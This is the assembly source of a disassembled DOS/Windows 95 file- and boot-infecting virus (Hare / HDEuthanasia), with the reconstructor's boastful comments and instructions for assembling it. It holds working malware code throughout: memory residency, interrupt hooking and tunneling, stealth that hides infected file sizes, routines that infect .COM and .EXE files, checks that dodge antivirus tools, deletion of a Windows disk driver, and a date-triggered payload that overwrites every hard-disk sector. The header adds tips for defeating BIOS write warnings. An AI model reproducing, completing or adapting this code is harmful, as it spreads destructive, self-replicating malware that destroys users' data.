;============================================================================
;
;  HDEuthanasia-v3 by Demon Emperor.
;
;
;  Disassembly of the Hare.7786 virus, done by T-2000 / [Invaders].
;
;  Dis one is a real BIG nasty motherfucker! (source > 120 kB!!!)
;
;
;
;  Very sloppy written! MUCH double, triple code, unstructured programming,
;  different variables used, etc. The most complex virus I ever saw.
;
;
;  I guess da source is 70% reconstructed, the rest is kinda hard to do,
;  So I don't think that I will complete it (I got better things tha do).
;  Also please don't blame me for the pretty lame disassembly, I released
;  it only Bcoz I haven't seen any other disasms of Hare. I U decide to
;  finish the rest of the disassembly, I would appreciate if U gave me a
;  copy.
;
;  Demon Emperor seems to have a great knowledge about Win95, he introduced
;  several interesting techniques. It's a shame though, that the virus
;  has a bunch of shortcomings, these are:
;
;       - It doesn't pad the polymorphic code (different filesizes).
;       - Shoddy programming: It could loose a lot of weight (bytes), if
;         the author has used more flexible routines. Note that most
;         variables are stored inside the virusbody!
;       - Disinfect-on-read stealth, this makes it VERY slow, and doesn't
;         work on write-protected disks.
;       - Sometimes generates inconsistent polymorphic junk, like calling
;         the timer-INTs (08h & 1Ch), setting pallets, etc.
;
;
;
;
;  Hare's most interesting features:
;
;       - Portlevel-access: it writes to the MBR using the I/O-ports,
;         instead of INT 13h, this way, the write cannot be detected by,
;         for example, behaviour-blockers and BIOS virus-protection.
;       - Auto-comply on BIOS virus-protection, when to BIOS asks the user
;         if the write to the bootsector/MBR may proceed, Hare will stuff
;         a bunch of proceed-keys in the keyboard-buffer.
;         (Proceed write Y/N?, Hare stuffs Y).
;       - It will delete the portdriver for the harddisk in the Win95-
;         directory. This way Win95 is forced to used the slow, but by
;         Hare trapped INT 13h, thus making the virus able to stealth
;         and infect even under a Windoze '95 environment.
;       - Slow polymorphics: two files infected on approx. the same moment,
;         will be almost identical to eachother. This makes it very hard
;         to generate test-samples.
;
;
;  Some additional tips:
;
;       - Auto-proceed keys: also hook INT 10h and don't allow any writes
;         to the screen. Turn-off PC-speaker, so alert isn't heard.
;
;
; ENCRYPTION: Hare has 3 layers of encryption: a full polymorphic layer
;             which is located at the end of the virus, and two slightly
;             polymorphic layers (random encryption-algorithms). The first
;             layer contains anti-debugging routines (basically just stack-
;             stacks). The virus was bloody easy to crack, this again shows
;             how useful memory-encryption could be...
;
;
;
;        TYPE: Multipartite full-stealth .COM & .EXE-infector.
;     TARGETS: 1st harddisk, 1.44M diskettes, .COM & .EXE-filez.
;        SIZE: 7786 + polymorphic decryptor.
;     PAYLOAD: Message & disktrashing.
;  ENCRYPTION: Slow polymorphic.
;      STATUS: In the wild.
;        DATE: April 1998 - June 1998.
;  MAH E-MAIL: T2000_@hotmail.com
;
;
;         BTW: And also a BIG fuck to the AV for naming HDEuthanasia Hare.
;              Now it reminds my of that stoopid long-eared wabbit.
;
;
; BACKGROUND INFO: The Hare-virus was spread via the Internet in the summer
;                  of 1996. The AV was in a great hurry to adapt their soft-
;                  ware to Hare.
;
;   FOR MORE INFO: F-Prot
;                  Virus Bulletin
;
;
; Nevertheless, I found this the most interesting virus I've ever seen,
; great respect goes the Demon Emperor, I hope to get some more info on
; that guy, like which other virii he has coded. Demon Emperor: come to
; Undernet, #virus sometime.
;
;
;  Assemble with TASM 3.2 (or compatible).
;
;       TASM hare.asm /m
;       TLINK hare.obj hare.exe
;
;
; *** = Bug report/remark (actually too many to write down).
;
;
; Shit! after completing this source I found a e-zine with also a disasm
; of Hare-v3! Well, whatever, this one is reconstructed & commented (kinda).
;
;
;============================================================================


                .MODEL  TINY    ; (hmmm... not really!).
                .STACK  1024
                .CODE


; The following equates show data references outside the range of the program.

Poly_Sector     EQU     OFFSET Buffer + 512 + 80
Virus_Size      EQU     (Virus_End - $)
Res_Check_i13h  EQU     5445h
Res_Check_i21h  EQU     0FE23h
Marker_Mem_i13h EQU     4554h
Marker_Mem_i21h EQU     000Dh
Marker_Boot     EQU     0CCFFh
Body_Sectors    EQU     (Virus_Size + 511) / 512


START:
 
                MOV     SI, 0                   ; Delta offset.
Padding         =       WORD PTR $-2

                CLD                             ; Restore possibly changed
                STI                             ; flags.

                MOV     CX, 0F2Ch               ; Decrypt second layer.
                MOV     DI, OFFSET Layer_2      ; (slightly polymorphic).
                ADD     DI, SI                  ; Add delta-offset.
Decrypt_2:
                ;NOT     WORD PTR CS:[DI]  ; decryption
                nop
                nop
Key_2:          nop

                INC     DI                      ; Next word.
		INC     DI
		LOOP    Decrypt_2

Layer_2:        MOV     AX, Res_Check_i21h      ; Hey Daddio! are your there?
		INT     21h

                CMP     AX, Marker_Mem_i21h     ; Are we already resident?

		PUSH    SI
		PUSH    DS

                JNE     Decrypt_Layer_3         ; Guess not...

		JMP     Exec_Host

Decrypt_Layer_3:

                MOV     AL, 0
Key_3           =       BYTE PTR $-1

                OR      AL, AL                  ; First generation?
		JZ      Make_Resident

		MOV     AH, AL
                ADD     AH, 01h
                MOV     CX, 0E65h
		MOV     DI, OFFSET NewInt01h
		ADD     DI, SI

Decrypt_3:      XOR     CS:[DI], AX             ; Decrypt word.
                INC     DI                      ; Next word.
		INC     DI
                ADD     AL, 2                   ; Sliding key.
                ADD     AH, 2
                LOOP    Decrypt_3               ; Repeat loop.

Make_Resident:  INT     12h                     ; Get total DOS-memory in AX.

		MOV     CL, 6
		SHL     AX, CL                  ; Convert to segment-address.

		DEC     AX
		MOV     ES, AX

		CMP     ES:[8], 'CS'            ; Systemcode?
		JE      Find_Last_MCB

LOC_8:          MOV     AH, 52h                 ; Get list of lists.
		INT     21h

		MOV     AX, ES:[BX-2]           ; Get 1st MCB.

Find_Last_MCB:  MOV     ES, AX

                CMP     BYTE PTR ES:[0], 'Z'    ; Last block found?
		JE      Last_MCB_Found

		MOV     AX, ES:[3]              ; Get total memory in MCB.
		INC     AX                      ; Plus size MCB (10h bytes).
		MOV     BX, ES
		ADD     AX, BX                  ; Current MCB + total mem.
		JMP     Find_Last_MCB

Last_MCB_Found: MOV     AX, ES:[3]              ; AX = Total memory in MCB.
                SUB     AX, (Virus_Size+1126)/16; Subtract our needed mem.
		JC      LOC_8

		MOV     ES:[3], AX              ; Put it back.
		INC     AX                      ; Plus size MCB.
		MOV     BX, ES
		ADD     AX, BX
		MOV     ES, AX

		POP     DS                      ; DS:SI = Entrypoint virus.
		POP     SI

		PUSH    SI
		PUSH    DS

		PUSH    CS
		POP     DS

                MOV     CX, Virus_Size          ; Copy virus to virussegment.
		XOR     DI, DI
		CLD
		REP     MOVSB

		PUSH    ES                      ; JMP to relocated virus.
                MOV     AX, OFFSET Relocated
		PUSH    AX
		RETF

;-------------------------------------
; 0 = No
; 1 = Yes
;                          (assume dis is incorrect info).
; Bits:
;       0
;       1  Disable stealth.
;       2  Windows 95/NT running.
;       3
;       4
;       5
;       6
;       7  Windows 95/NT running. *
;-------------------------------------

Relocated:
		MOV     CS:Flags, CL            ; Clear Flags variable.

		MOV     AX, 160Ah               ; Identify Windows version
		INT     2Fh                     ; and type.

		OR      AX, AX                  ; Function accepted?
		JNZ     Bad_Windows

		CMP     CX, 03h                 ; Enhanched version running?
		JB      Bad_Windows

                OR      CS:Flags, 10000000b

Bad_Windows:    CALL    Check_Poly_Sector
                CALL    Infect_Harddisk

		PUSH    CS
		POP     DS

		MOV     AH, 52h                 ; List of lists.
		INT     21h

		MOV     AX, ES:[BX-2]           ; Get 1st MCB in AX.
		MOV     First_MCB, AX           ; Save it for the tracer.

                MOV     Trace_Function, 19h     ; Get default drive.
                MOV     Fake_PUSHF, 00h
                MOV     Trace_Done, 01h

		MOV     AX, 3521h               ; Get address INT 21h.
		INT     21h

                MOV     Int21h, BX              ; Save INT 21h.
		MOV     Int21h+2, ES

                MOV     Trace_Int, BX           ; Find entrypoint.
		MOV     Trace_Int+2, ES
		CALL    Tracer

		CLD                             ; Replace address INT 21h
		MOV     SI, OFFSET Trace_Int    ; with traced address.
		MOV     DI, OFFSET Traced_Int21h
		MOVSW
		MOVSW

		XOR     AX, AX                  ; Hook INT 21h.
		MOV     DS, AX

		MOV     DS:[21h * 4], OFFSET NewInt21h
		MOV     DS:[21h * 4 + 2], CS

                CALL    CheckWin4Hook
		CALL    Del_PortDriver

		POP     ES                      ; ES:DI = Virus entrypoint.
		POP     SI

		XOR     SI, SI

		PUSH    SI
		PUSH    ES

Exec_Host:      POP     ES
		POP     SI

		PUSH    ES
		POP     DS

		PUSH    DS

                CMP     CS:[SI+Host_Type], 01h  ; Host .EXE-file?
		JE      Exec_EXE

		ADD     SI, OFFSET Old_Entry
		MOV     DI, 100h
                PUSH    DI                      ; PUSH entrypoint .COM-file.
		CLD

		PUSH    CS
		POP     DS

		MOVSW                           ; Restore original 3 bytes
                MOVSB                           ; in da .COM-file.

		PUSH    ES
		POP     DS

		CALL    Clear_Registers

                RETF                            ; JMP to host.

Exec_EXE:
                MOV     AX, CS:[SI+Old_Entry+2]
		POP     BX

		ADD     BX, 10h                 ; Plus size PSP.
                ADD     AX, BX                  ; Add effective segment.
                MOV     CS:[SI+JMP_Host+2], AX  ; Store it in the code.
		MOV     AX, CS:[SI+Old_Entry]

		MOV     CS:[SI+JMP_Host], AX
		ADD     CS:[SI+Old_Stack+2], BX

                CALL    Clear_Registers         ; Clear registers & flags.

		MOV     SS, CS:[SI+Old_Stack+2]
		MOV     SP, CS:[SI+Old_Stack]


		DB      0EAh                    ; JMP to host.
JMP_Host        DW      0, 0

Traced_Int21h   DW      0, 0
Int21h          DW      0, 0

JMP_COM         DB      90h                     ; JMP to virus in .COM-file.
		DW      0


Host_COM_JMP:

Old_Entry       DW      OFFSET Carrier, 0
Old_Stack       DW      0, 0
Old_Mod512      DW      30h
Old_Byte_Pages  DW      2
FileTime        DW      9AA0h
Host_Type       DB      01h
Temp1           DW      1E6Ah, 3
Trace_Int       DW      9AA0h, 2498h
First_MCB       DW      253h
Trace_Done      DB      0
Fake_PUSHF      DB      0
CodeSegment     DW      0
Int1Ch          DW      0, 0
Flags           DB      0
PSP_Segment     DW      0
Free_Clusters   DW      0
Trace_Function  DB      3


Clear_Registers:

		XOR     AX, AX

                PUSH    AX                      ; Clear all flags (also TF),
                POPF                            ; *** Bad approach, thiz may
                                                ; conflict with future flags.

		STI

		MOV     CX, AX                  ; Clear registers.
		MOV     DI, AX
		MOV     BP, AX
		MOV     DX, AX
		MOV     BX, AX

		RETN


;
; Standard recursive tunneler with some opcode-checks.
;
NewInt01h:
		PUSH    AX
		PUSH    BX
		PUSH    BP
		PUSH    DS

                MOV     BP, SP                  ; Set base-pointer.

		MOV     AX, [BP+10]             ; AX = CS.
		MOV     BX, [BP+08]             ; BX = IP.

		MOV     CS:CodeSegment, CS

                CMP     AX, CS:CodeSegment      ; In our own CS ?
                JE      Exit_Int01h             ; Then skip trace.

                CALL    Check_Opcode            ; Handle PUSHF, etc.

                CMP     AX, 0F000h              ; In BIOS ?
                JAE     Found_BIOS

		CMP     AX, CS:First_MCB        ; In DOS-segment?
		JA      Exit_Int01h             ; Continue tracing when not.

Found_BIOS:     AND     CS:Trace_Done, 00000001b
		JZ      Exit_Int01h

                MOV     CS:Trace_Done, 0
		MOV     CS:Trace_Int+2, AX      ; Store segment.
		MOV     AX, [BP+8]
		MOV     CS:Trace_Int, AX        ; Store offset.

Exit_Int01h:    POP     DS
		POP     BP
		POP     BX
		POP     AX

                CMP     CS:Fake_PUSHF, 1
                JE      Do_Fake_PUSHF

		IRET

Do_Fake_PUSHF:
		MOV     CS:Fake_PUSHF, 0

                RETF                            ; RETF with TF cleared,
                                                ; (always cleared in a INT).

        ; ^ *** I don't like this method at all, it doesn't restore
        ; the original flags of the program. Can cause problems.


Tracer:
		MOV     AX, 3501h               ; Get INT 01h address.
		INT     21h

                MOV     Temp1, BX               ; Save INT 01h address.
		MOV     Temp1+2, ES
		MOV     DX, OFFSET NewInt01h

                MOV     AH, 25h                 ; Hook INT 01h.
		INT     21h

		XOR     DL, DL

                PUSHF                           ; Turn TF on.
		POP     AX
                OR      AX, 100h                ; *** Better use OR AH, 01h.
                PUSH    AX
		POPF

		MOV     AH, Trace_Function

		PUSHF                           ; Trace the function.
		CALL    DWORD PTR Trace_Int

		PUSHF
		POP     AX
		AND     AX, NOT 100h            ; Single-step mode off.
		PUSH    AX
		POPF

                LDS     DX, DWORD PTR Temp1     ; Restore INT 01h.
		MOV     AX, 2501h
		INT     21h

                PUSH    CS                      ; CS=DS=ES.
		PUSH    CS
		POP     ES
		POP     DS

		RETN


Check_Opcode:
		PUSH    AX
                MOV     DS, AX                  ; DS = codesegment of instr.
                MOV     AL, DS:[BX]             ; Get instruction in AL.

		CMP     AL, 9Dh                 ; Next instruction POPF ?
                JNE     Check_PUSHF

                OR      [BP+0Ch], 100h          ; Set TF in flags on stack.
                JMP     Exit_Check_Opcode

                NOP                             ; !@#$%^&*!

Check_PUSHF:    CMP     AL, 9Ch                 ; PUSHF ?
                JNE     Exit_Check_Opcode

                INC     WORD PTR [BP+8]         ; Skip PUSHF.
                MOV     CS:Fake_PUSHF, 01h

Exit_Check_Opcode:

		POP     AX

		RETN

Check_Trigger:
                MOV     AH, 04h                 ; Read date from clock.
		INT     1Ah

                TEST    DH, 00001000b           ; August or higher?
                JZ      Luck_4_User

		CMP     DL, 22h                 ; Trigger-date?
                JE      Payload                 ; Ermmm... 34th day (???????)

Luck_4_User:
                RETN


        ; === hehe, this is the part I like most! ===

PayLoad:
		MOV     AX, 03h                 ; Clear the screen.
		INT     10h

		MOV     SI, OFFSET Message      ; Display text.
		MOV     BH, 00h
		MOV     CX, 3Dh

Display_Char:   LODSB                           ; Load next character.
		MOV     AH, 0Eh                 ; Display character.
		INT     10h

		LOOP    Display_Char

                MOV     DL, 80h                 ; 1st harddrive.

Trash_Loop:     MOV     BH, DL
		XOR     DL, 01h

		MOV     AH, 08h                 ; Get disk drive parameters.
		INT     13h

		AND     CL, 00111111b           ; 0 - 63.
		MOV     AL, CL
		MOV     AH, 03h
		PUSH    AX
		MOV     DL, BH
                MOV     AH, 08h
                INT     13h                     ; Disk  dl=drive 0  ah=func 08h
						;  get drive parameters, bl=type
						;   cx=cylinders, dh=max heads
		AND     CL, 00111111b           ; 0 - 63.
		MOV     AL, CL
		MOV     AH, 03h
		MOV     DL, BH
		MOV     CX, 0101h
		PUSH    AX
		MOV     BP, SP

LOC_23:         PUSH    DX

LOC_24:         TEST    DL, 00000001b
		JNZ     LOC_25

		MOV     AX, [BP]
		JMP     LOC_26

LOC_25:
                MOV     AX, [BP+2]

LOC_26:         INT     13h                     ; Overwrite sectors, (yeah!).
                XOR     DL, 01h

		DEC     DH
		JNZ     LOC_24

		POP     DX

		INC     CH
		JNZ     LOC_23

                ADD     CL, 64
		JNC     LOC_23

		ADD     DL, 2
		ADD     SP, 4

                JMP     Trash_Loop

; Calls the original INT 21h.

Traced_i21h:
		PUSHF
		CALL    DWORD PTR CS:Traced_Int21h

		RETN

Stealth_DiskSpace:

		PUSH    BX
		PUSH    AX

		MOV     AH, 62h                 ; Get PSP-address.
		CALL    Traced_i21h

		POP     AX

		CMP     CS:PSP_Segment, BX
                JNE     Save_Free_Clusters

		CMP     CS:Trace_Function, DL   ; Drive.
                JNE     Save_Free_Clusters

		POP     BX
		POPF

		CALL    Traced_i21h
		MOV     BX, CS:Free_Clusters    ; Fake # of free clusters.

		RETF    2


Save_Free_Clusters:

		MOV     CS:PSP_Segment, BX
		MOV     CS:Trace_Function, DL   ; Save drive.
		POP     BX
		POPF
                CALL    Traced_i21h             ; Execute function.

		MOV     CS:Free_Clusters, BX    ; Genuine # of free clusters.

		RETF    2

Stealth_Filesize:

		CALL    DWORD PTR CS:Int21h    ; Execute function.

		PUSHF
		PUSH    AX
		PUSH    BX
		PUSH    ES

		TEST    CS:Flags, 00000010b     ; Stealth-Mode off?
		JNZ     Exit_Size_Stealth       ; Then no file-stealth.

		OR      AL, AL                  ; No error occurred?
		JNZ     Exit_Size_Stealth       ; Else exit.

		MOV     AH, 2Fh                 ; Get DTA-address.
		CALL    Traced_i21h

                CMP     CS:Function_i21h, 40h   ; FCB/Dir ?
		JA      Dir_Stealth

                OR      WORD PTR ES:[BX+26h], 0 ; File above 64k ?
                JNZ     FCB_Over_64k

                CMP     ES:[BX+24h], 1E9Ch      ; File too small?
		JB      Exit_Size_Stealth

FCB_Over_64k:   MOV     AX, ES:[BX+1Eh]
		AND     AL, 00011111b           ; Erase all but seconds.

                CMP     AL, (34 / 2)            ; 34 seconds?
		JNE     Exit_Size_Stealth

		SUB     WORD PTR ES:[BX+24h], (Virus_Size + 70)
		SBB     WORD PTR ES:[BX+26h], 0

		JMP     Exit_Size_Stealth

Dir_Stealth:
                OR      WORD PTR ES:[BX+1Ch], 0
                JNZ     Handle_Over64k

                CMP     ES:[BX+1Ah], 1E9Ch      ; File too small?
		JB      Exit_Size_Stealth

Handle_Over64k: MOV     AX,ES:[BX+16h]          ; Get time in AX.
                AND     AL, 00011111b           ; Mask seconds.

                CMP     AL, (34 / 2)            ; 34 seconds?
		JNE     Exit_Size_Stealth

                SUB     WORD PTR ES:[BX+1Ah], (Virus_Size + 70)
                SBB     WORD PTR ES:[BX+1Ch], 0

Exit_Size_Stealth:

		POP     ES
		POP     BX
		POP     AX
		POPF

		RETF    2


Size_Stealth:   MOV     CS:Function_i21h, AH    ; Save function #.
		JMP     Stealth_Filesize

Function_i21h   DB      4Eh

Residency_Check:
                MOV     AX, Marker_Mem_i21h     ; Return our sign.
		POPF

		RETF    2

NewInt21h:
		PUSHF

                CMP     AX, Res_Check_i21h      ; Residency-check.
                JE      Residency_Check

		CMP     AH, 36h                 ; Get free diskspace.
		JNE     Check_Next_3

		JMP     Stealth_DiskSpace

Check_Next_3:
		CMP     AH, 4Ch                 ; Program terminate.
                JE      Check_PSP_Infect

		CMP     AH, 31h                 ; Terminate & stay resident.
                JE      Check_PSP_Infect

		CMP     AH, 00h                 ; Terminate program.
                JE      Check_PSP_Infect

		CMP     AX, 4B00h               ; Program execute.
		JNE     Check_Next_4

		CALL    Infect_Exec

Check_Next_4:   CMP     AH, 11h                 ; Findfirst (FCB).
		JE      Size_Stealth

		CMP     AH, 12h                 ; Findnext (FCB).
		JE      Size_Stealth

		CMP     AH, 4Eh                 ; Findfirst (handle).
		JE      Size_Stealth

		CMP     AH, 4Fh                 ; Findnext (handle).
		JE      Size_Stealth

		CMP     AH, 3Dh                 ; Open file (handle).
		JNE     Check_Next_5

		CALL    Clean_File

Check_Next_5:   CMP     AH, 3Eh                 ; Close file (handle).
		JNE     LOC_39

		POPF
		CALL    Infect_Close

                RETF    2                       ; Return to caller.
LOC_39:         POPF

		JMP     DWORD PTR CS:Int21h

Check_PSP_Infect:

		AND     CS:Flags, 00000100b

                PUSH    AX                      ; Save registers.
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    DI
		PUSH    ES
		PUSH    DS

		MOV     AH, 62h                 ; Get PSP.
		CALL    Traced_i21h
		JC      Exit_PSP_Check

		CLD
                MOV     ES, BX                  ; ES = PSP current process.
                MOV     ES, ES:[2Ch]            ; ES = Environment-path.
		XOR     DI, DI
		MOV     AL, 00h

Find_Next_Setting:

		MOV     CX, 0FFFFh
                REPNE   SCASB                   ; Find next setting.

                CMP     ES:[DI], AL             ; End of settings?
                JNE     Find_Next_Setting

                ADD     DI, 3                   ; Get path of the program
                MOV     DX, DI                  ; executing.

		PUSH    ES
		POP     DS

		MOV     AX, 3D00h               ; Open file...
		CALL    Traced_i21h
		JC      Exit_PSP_Check

		MOV     BX, AX                  ; And infect it on closing.
		CALL    Infect_Close

Exit_PSP_Check:

                POP     DS                      ; Restore registers.
		POP     ES
		POP     DI
		POP     DX
		POP     CX
		POP     BX
		POP     AX
		POPF

		JMP     DWORD PTR CS:Traced_Int21h


; AX = 4B00h

Infect_Exec:
		PUSH    AX                      ; Save registers.
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    DI
		PUSH    SI

		CALL    Check_To_Del_Driver
		CALL    Set_Dummy_Handlers
		CALL    Save_FileAttr
		CALL    Check_FileName

		PUSHF
		PUSH    DS

		PUSH    CS
		POP     DS

                MOV     DI, 0
                ORG     $-2
Gaby1           DW      OFFSET FileName1
		MOV     SI, OFFSET FileName2

		ADD     BX, 04h
		MOV     CX, BX
		REP     MOVSB

		POP     DS
		POPF
                JC      Exit_Infect_Exec        ; Special file?

		MOV     AX, 3D02h               ; Open file r/w.
		CALL    Traced_i21h

		XCHG    BX, AX                  ; BX = Filehandle.
		CALL    Save_FileTime
                MOV     AX, CS:Trace_Int        ; Get filetime.
		AND     AL, 00011111b           ; Mask seconds.
		PUSH    AX

		MOV     AH, 3Fh                 ; Read header.
		MOV     CX, 28

		PUSH    CS
		POP     DS

		PUSH    DS
		POP     ES

                MOV     DX, OFFSET Buffer
		CALL    Traced_i21h

		MOV     SI, DX
		CLD
		LODSW                           ; Get 1st word from header.

		CMP     AX, 'ZM'                ; True .EXE-file?
		JE      Is_EXE

		CMP     AX, 'MZ'                ; True .EXE-file?
		JNE     Is_COM                  ; Else it's a .COM-file.

Is_EXE:         POP     AX                      ; POP filetime.

		TEST    Flags, 00000100b
		JZ      LOC_44

                CMP     AL, 11h                 ; Infected timestamp?
                JE      Do_Restore_Filetime

                CALL    Infect_EXE              ; Else infect .EXE-file.
                JNC     Set_Infected_Stamp

		JMP     Exit_Infect_Exec

LOC_44:
                CMP     AL, (34 / 2)            ; 34 seconds, thus infected?
                JNE     Do_Restore_Filetime

		CALL    SUB_41
                JNC     Do_Restore_Filetime

		JMP     Exit_Infect_Exec

Is_COM:         POP     AX                      ; AX = Filetime.

                CMP     AL, (34 / 2)            ; 34 seconds, infected?
		JE      Exit_Infect_Exec

		CALL    Infect_COM
                JC      Do_Restore_Filetime

Set_Infected_Stamp:

		MOV     AX, Trace_Int           ; Set infected timestamp.
		AND     AL, 11100000b
                OR      AL, (34 / 2)            ; 34 seconds.
		MOV     Trace_Int, AX

Do_Restore_Filetime:

		CALL    Restore_FileTime

Exit_Infect_Exec:

		MOV     AH, 3Eh                 ; Close file.
		CALL    Traced_i21h

		CALL    Restore_FileAttr
		CALL    Restore_Dummy_Handlers

                POP     SI                      ; Restore registers.
		POP     DI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

		RETN


; Checks if INT 13h part is resident, and deletes portdriver if so.
Check_To_Del_Driver:

		CALL    Del_PortDriver

		MOV     AX, 160Ah               ; Identify Windows version
		INT     2Fh                     ; and type.

		OR      AX, AX                  ; Legal function?
		JNZ     Exit_Del_PortDriver

		CMP     BH, 04h                 ; Windows ver. 4 or higher?
		JB      Exit_Del_PortDriver

                MOV     AX, Res_Check_i13h      ; INT 13h residency-check.
		INT     13h

                CMP     AX, Marker_Mem_i13h     ; INT 13h part installed?
		JNE     Exit_Del_PortDriver

		CALL    Del_PortDriver
		JC      LOC_49                  ; File not found?

		RETN

LOC_49:         CALL    Unslice_Int13h

Exit_Del_PortDriver:

		RETN



Infect_EXE:
                CMP     Buffer.Reloc_Offs, 40h  ; PE-header?
		JNE     LOC_52

		STC
LOC_51:         JMP     Exit_Infect_EXE
LOC_52:         MOV     DI, OFFSET Old_Entry    ; Save old CS:IP.
                MOV     SI, OFFSET Buffer.Init_IP

		MOVSW
		MOVSW

                MOV     SI, OFFSET Buffer.Init_SS  ; Save old SS:SP.
		MOV     DI, OFFSET Old_Stack+2
		MOVSW
		SUB     DI, 04h
		MOVSW

                MOV     SI, DX                  ; Buffer.
                MOV     Host_Type, 01h          ; Host is .EXE-file.

                CALL    Check_Infect            ; Suitable for infection?
                JC      LOC_51                  ; CF set if not.

                MOV     AX, Trace_Int           ; Save time.
                MOV     FileTime, AX

                MOV     AX, [SI+2]              ; Filesize MOD 512.
                MOV     Old_Mod512, AX

                MOV     AX, [SI+4]              ; File in 512-byte pages.
                MOV     Old_Byte_Pages, AX

                MOV     AX, [SI+4]              ;
                MOV     DX, 512

                CMP     WORD PTR [SI+2], 0      ; No rounding?
		JE      LOC_53

                DEC     AX                      ;
LOC_53:         MUL     DX                      ; Calculate filesize.
		MOV     Temp1+2, DX
                MOV     DX, [SI+2]
                ADD     AX, DX                  ; Plus filesize MOD 512.
                ADC     Temp1+2, 00h
		MOV     Temp1, AX

		PUSH    AX

                XOR     CX, CX                  ; Go to end of file.
                MOV     DX, CX                  ; DX:AX = Filesize.
		MOV     AX, 4202h
		CALL    Traced_i21h

                SUB     AX, Temp1               ; Same size as in header?
                JZ      Good_Size_Lo            ; (ie. no internal overlay?).

                POP     AX
		STC

                JMP     Exit_Infect_EXE

Good_Size_Lo:   SUB     DX, Temp1+2             ; Same size as in header?
                JZ      Good_Size_Hi

		POP     AX
		STC

                JMP     Exit_Infect_EXE

Good_Size_Hi:
                POP     AX                      ; Filesize low.
                MOV     CX, Temp1+2             ; Filesize high.
		MOV     DX, AX
                MOV     AX, 4200h               ; Go to end file.
		CALL    Traced_i21h

                MOV     AX, 1E7Bh
                MOV     DX, [SI+2]              ; Filesize MOD 512.
                ADD     DX, AX
LOC_56:         INC     WORD PTR [SI+4]         ; Filesize in 512-byte pages.
                SUB     DX, 512

                CMP     DX, 512
		JA      LOC_56

                JNE     LOC_57
		XOR     DX, DX
LOC_57:         MOV     [SI+2], DX

                MOV     AX, [SI+8]              ; Size header in paragraphs.
                MOV     CX, 16
                MUL     CX                      ; Calculate headersize bytes.

                MOV     CX, Temp1               ; Filesize minus headersize.
		SUB     CX, AX
		SBB     Temp1+2, DX

                MOV     DI, Temp1+2             ; Filesize high.
                MOV     SI, CX                  ; Filesize low.

		MOV     DX, DI
		MOV     AX, SI
                MOV     CX, 16
                DIV     CX                      ; Filesize DIV 16.

                MOV     DI, AX
		MOV     SI, DX

                MOV     Host_Entrypoint, SI
                MOV     Padding, SI             ; 0 - 15 bytes padding.

                ADD     SI, OFFSET Buffer       ; Plus end of virus.
		MOV     Temp1, SI
		MOV     Temp1+2, DI

                CLD                             ; Set host's new entrypoint.
		MOV     SI, OFFSET Temp1
                MOV     DI, OFFSET Buffer.Init_IP

		MOVSW
		MOVSW

                CALL    Poly_Engine             ; Polymorphic encryptor.
                JC      Exit_Infect_EXE

		XOR     CX, CX                  ; Go to start of file.
		MOV     DX, CX
		MOV     AX, 4200h
		CALL    Traced_i21h

                CALL    Make_Random_Stack

		MOV     DX, OFFSET Buffer       ; Write updated header.
		MOV     AH, 40h
		MOV     CX, 28
		CALL    Traced_i21h

Exit_Infect_EXE:

		RETN


Infect_COM:     MOV     Host_Type, 00h          ; Set host as .COM-file.
                CLD
                MOV     DI, OFFSET Host_COM_JMP
		MOV     SI, OFFSET Buffer
                CALL    Check_Infect            ; Suitable for infection?
		JC      LOC_59

                MOV     CX, 3                   ; Copy first 3 bytes of host
                REP     MOVSB                   ; to our storage-place.

                MOV     DX, CX                  ; Go to end of file.
                MOV     AX, 4202h               ; DX:AX = Filesize.
		CALL    Traced_i21h

                OR      DX, DX                  ; File under 64k?
		JZ      LOC_60

LOC_59:         STC
                JMP     Exit_Infect_COM

LOC_60:
                CMP     AX, 30                  ; File too small?
		JB      LOC_59

                XOR     CX, CX                  ; Go to end of file.
                MOV     DX, CX                  ; DX:AX = Filesize.
		MOV     AX, 4202h
                CALL    Traced_i21h

                CMP     AX, 55701               ; File too big?
		JB      LOC_61

                STC                             ; Set carry-flag (error).
                JMP     Exit_Infect_COM

LOC_61:
                MOV     Host_Entrypoint, AX
                ADD     Host_Entrypoint, 100h
                MOV     Padding, AX             ; Virus entrypoint.
                ADD     Padding, 100h           ; Plus .COM-entrypoint.

		MOV     DI, OFFSET JMP_COM
                MOV     BYTE PTR [DI], 0E9h     ; JMP opcode.
                SUB     AX, 3                   ; Minus displacement.
                ADD     AX, Virus_Size          ; Plus entrypoint.
                MOV     [DI+1], AX              ; Store it.

                CALL    Poly_Engine             ; Append polymorphic copy.
                JC      Exit_Infect_COM

                XOR     CX, CX                  ; Go to start file.
		MOV     DX, CX
		MOV     AX, 4200h
		CALL    Traced_i21h

                MOV     CX, 3                   ; Write JMP Virus to start
		MOV     DX, OFFSET JMP_COM      ; of .COM-file.
		MOV     AH, 40h
		CALL    Traced_i21h

Exit_Infect_COM:

		RETN


Save_FileTime:
                MOV     AX, 5700h               ; Get filetime.
		CALL    Traced_i21h
		MOV     CS:Trace_Int, CX
		MOV     CS:Trace_Int+2, DX

		RETN


; Guess what...!?
Restore_FileTime:

                MOV     AX, 5701h               ; Set timestamp.
                MOV     CX, CS:Trace_Int
                MOV     DX, CS:Trace_Int+2
		CALL    Traced_i21h

		RETN


;
; Saves file attributes, and clears them afterwards.
;  In: BX = Filehandle.
;
Save_FileAttr:
		MOV     AX, 4300h               ; Get file-attributes.
		CALL    Traced_i21h

		MOV     CS:CodeSegment, CX
		MOV     AX, 4301h               ; Clear file-attributes.
		XOR     CX, CX
		CALL    Traced_i21h

		RETN


Restore_FileAttr:

		MOV     AX, 4301h               ; Set file-attributes.
		MOV     CX, CS:CodeSegment
		CALL    Traced_i21h

		RETN

SUB_14:
		PUSH    DS

		PUSH    CS
		POP     DS

		CLD
		MOV     SI, OFFSET FileName2
		SUB     BX, 4
		JC      LOC_63

		MOV     AX, [SI]

		CMP     AX, 'BT'                ; TBAV utilities?
		STC
		JE      LOC_63

		CMP     AX, '-F'                ; F-Prot?
		JE      LOC_65

		CMP     AX, 'VI'                ; Invircible?
		JE      LOC_65

		CMP     AX, 'HC'                ; CHKDSK.EXE ?
		JE      LOC_64

                MOV     AL, 'V'                 ; Filename contains a 'V' ?
		MOV     DI,OFFSET FileName2
                MOV     CX, BX
		INC     CX
                REPNE   SCASB

                OR      CX, CX                  ; Found?
		STC
                JNZ     LOC_63                  ; Then exit with carry set.

